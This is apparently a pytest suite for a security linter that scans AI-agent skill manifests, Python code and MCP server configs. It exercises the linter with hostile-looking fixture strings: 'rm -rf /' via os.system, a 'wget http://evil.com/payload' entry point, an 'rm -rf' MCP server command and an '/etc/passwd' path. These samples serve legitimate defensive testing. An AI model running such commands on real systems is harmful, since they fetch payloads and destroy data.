"""Tests for the SecurityLinter module."""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from kazma_core.security.linter import LintReport, LintResult, Rule, SecurityLinter, SECURITY_RULES


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def linter() -> SecurityLinter:
    return SecurityLinter()


@pytest.fixture
def sample_skill(tmp_path: Path) -> Path:
    """Create a minimal skill directory with a clean manifest and code."""
    skill = tmp_path / "my-skill"
    skill.mkdir()
    (skill / "skill.yaml").write_text("name: my-skill\nversion: 1.0.0\npermissions: [read]\n")
    (skill / "main.py").write_text("def hello():\n    return 'world'\n")
    return skill


@pytest.fixture
def dirty_skill(tmp_path: Path) -> Path:
    """Create a skill directory with intentional security violations."""
    skill = tmp_path / "dirty-skill"
    skill.mkdir()
    (skill / "skill.yaml").write_text(
        "name: dirty-skill\n"
        "version: 1.0.0\n"
        "env:\n"
        "  DATABASE_PASSWORD: s3cret\n"
        "  API_KEY: sk-test12345678901234567890123456789012\n"
        "permissions: [admin]\n"
    )
    (skill / "insecure.py").write_text(
        textwrap.dedent("""\
            import os, subprocess

            password = 'hardcoded_secret_123'

            def bad():
                eval("dangerous")
                exec("more dangerous")
                os.system("rm -rf /")
                subprocess.run("echo hi", shell=True)
                subprocess.call(["ls"], shell=True)
                f = open("secret.txt")
        """)
    )
    return skill


@pytest.fixture
def mcp_skill(tmp_path: Path) -> Path:
    """Create a skill with dangerous MCP server configs."""
    skill = tmp_path / "mcp-skill"
    skill.mkdir()
    (skill / "skill.yaml").write_text(
        "name: mcp-skill\n"
        "version: 1.0.0\n"
        "mcp_servers:\n"
        "  - name: bad-server\n"
        "    command: rm\n"
        "    args: [-rf, /tmp/data]\n"
        "  - name: clean-server\n"
        "    command: python\n"
        "    args: [server.py]\n"
    )
    return skill


# ---------------------------------------------------------------------------
# Rule catalogue tests
# ---------------------------------------------------------------------------

class TestSecurityLinterRules:
    def test_security_rules_count(self):
        assert len(SECURITY_RULES) == 13

    def test_rule_severity_levels(self):
        severies = {r.severity for r in SECURITY_RULES}
        assert severies == {"critical", "high", "medium", "low"}

    def test_rule_dataclass(self):
        rule = Rule(id="T001", description="test rule", severity="high")
        assert rule.id == "T001"
        assert rule.description == "test rule"
        assert rule.severity == "high"

    def test_all_rules_have_required_fields(self):
        for rule in SECURITY_RULES:
            assert rule.id.startswith("SEC")
            assert len(rule.description) > 0
            assert rule.severity in ("critical", "high", "medium", "low")


# ---------------------------------------------------------------------------
# Manifest linting
# ---------------------------------------------------------------------------

class TestLintManifest:
    @pytest.mark.asyncio
    async def test_clean_manifest(self, linter: SecurityLinter):
        results = await linter.lint_manifest({"name": "good-skill", "permissions": ["read"]})
        assert all(r.passed for r in results)

    @pytest.mark.asyncio
    async def test_secret_in_env(self, linter: SecurityLinter):
        results = await linter.lint_manifest({"env": {"DATABASE_PASSWORD": "***", "API_KEY": "sk-xxx"}})
        failed = [r for r in results if not r.passed]
        rule_ids = {r.rule_id for r in failed}
        assert "SEC001" in rule_ids
        assert "SEC002" in rule_ids

    @pytest.mark.asyncio
    async def test_overly_broad_permissions(self, linter: SecurityLinter):
        results = await linter.lint_manifest({"permissions": ["admin", "root"]})
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC011" for r in failed)

    @pytest.mark.asyncio
    async def test_suspicious_entry_point(self, linter: SecurityLinter):
        results = await linter.lint_manifest({"entry_point": "wget http://evil.com/payload"})
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC010" for r in failed)

    @pytest.mark.asyncio
    async def test_empty_manifest(self, linter: SecurityLinter):
        results = await linter.lint_manifest({})
        assert all(r.passed for r in results)


# ---------------------------------------------------------------------------
# Code linting
# ---------------------------------------------------------------------------

class TestLintCode:
    @pytest.mark.asyncio
    async def test_hardcoded_password(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("password = 'supersecret123'\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC001" for r in failed)

    @pytest.mark.asyncio
    async def test_eval_usage(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("eval('1+1')\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC003" for r in failed)

    @pytest.mark.asyncio
    async def test_exec_usage(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("exec('import os')\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC004" for r in failed)

    @pytest.mark.asyncio
    async def test_os_system(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("import os\nos.system('echo pwned')\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC005" for r in failed)

    @pytest.mark.asyncio
    async def test_subprocess_shell_true(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("import subprocess\nsubprocess.run('echo hi', shell=True)\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC006" for r in failed)

    @pytest.mark.asyncio
    async def test_clean_code(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "good.py").write_text("def add(a, b):\n    return a + b\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert len(failed) == 0

    @pytest.mark.asyncio
    async def test_token_literal(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("token = 'ghp_abcdef1234567890abcdef1234567890abcd'\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC002" for r in failed)

    @pytest.mark.asyncio
    async def test_insecure_url(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("url = 'http://example.com/api'\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC008" for r in failed)

    @pytest.mark.asyncio
    async def test_open_without_mode(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("f = open('data.txt')\n")
        results = await linter.lint_code(tmp_path)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC007" for r in failed)

    @pytest.mark.asyncio
    async def test_syntax_error_handled(self, linter: SecurityLinter, tmp_path: Path):
        (tmp_path / "bad.py").write_text("def (\n")
        results = await linter.lint_code(tmp_path)
        # Should not raise, just return empty or partial results
        assert isinstance(results, list)


# ---------------------------------------------------------------------------
# MCP server linting
# ---------------------------------------------------------------------------

class TestLintMCPServers:
    @pytest.mark.asyncio
    async def test_clean_mcp_server(self, linter: SecurityLinter):
        servers = [{"name": "math", "command": "python", "args": ["math_server.py"]}]
        results = await linter.lint_mcp_servers(servers)
        assert all(r.passed for r in results)

    @pytest.mark.asyncio
    async def test_dangerous_command(self, linter: SecurityLinter):
        servers = [{"name": "evil", "command": "rm", "args": ["-rf", "/tmp"]}]
        results = await linter.lint_mcp_servers(servers)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC006" for r in failed)

    @pytest.mark.asyncio
    async def test_suspicious_path(self, linter: SecurityLinter):
        servers = [{"name": "susp", "command": "/etc/passwd", "args": []}]
        results = await linter.lint_mcp_servers(servers)
        failed = [r for r in results if not r.passed]
        assert any(r.rule_id == "SEC010" for r in failed)

    @pytest.mark.asyncio
    async def test_empty_servers(self, linter: SecurityLinter):
        results = await linter.lint_mcp_servers([])
        assert results == []


# ---------------------------------------------------------------------------
# Skill-level linting (integration)
# ---------------------------------------------------------------------------

class TestLintSkill:
    @pytest.mark.asyncio
    async def test_lint_skill_clean(self, linter: SecurityLinter, sample_skill: Path):
        report = await linter.lint_skill(sample_skill)
        assert isinstance(report, LintReport)
        # Clean skill should pass
        assert report.passed is True

    @pytest.mark.asyncio
    async def test_lint_skill_dirty(self, linter: SecurityLinter, dirty_skill: Path):
        report = await linter.lint_skill(dirty_skill)
        assert report.passed is False
        assert report.critical > 0
        assert report.high > 0

    @pytest.mark.asyncio
    async def test_lint_skill_no_manifest(self, linter: SecurityLinter, tmp_path: Path):
        skill = tmp_path / "no-manifest"
        skill.mkdir()
        (skill / "code.py").write_text("x = 1\n")
        report = await linter.lint_skill(skill)
        assert report.passed is True


# ---------------------------------------------------------------------------
# LintReport
# ---------------------------------------------------------------------------

class TestLintReport:
    def test_report_counts(self):
        results = [
            LintResult("SEC001", "critical", "crit", passed=False),
            LintResult("SEC003", "high", "high", passed=False),
            LintResult("SEC008", "medium", "med", passed=False),
            LintResult("SEC011", "low", "low", passed=False),
            LintResult("SEC001", "critical", "ok", passed=True),
        ]
        report = LintReport(
            passed=False,
            critical=1,
            high=1,
            medium=1,
            low=1,
            results=results,
        )
        assert report.critical == 1
        assert report.high == 1
        assert report.medium == 1
        assert report.low == 1

    def test_report_passed(self):
        report = LintReport(passed=True, critical=0, high=0, medium=2, low=3)
        assert report.passed is True

    def test_report_failed_on_critical(self):
        report = LintReport(passed=False, critical=1, high=0)
        assert report.passed is False
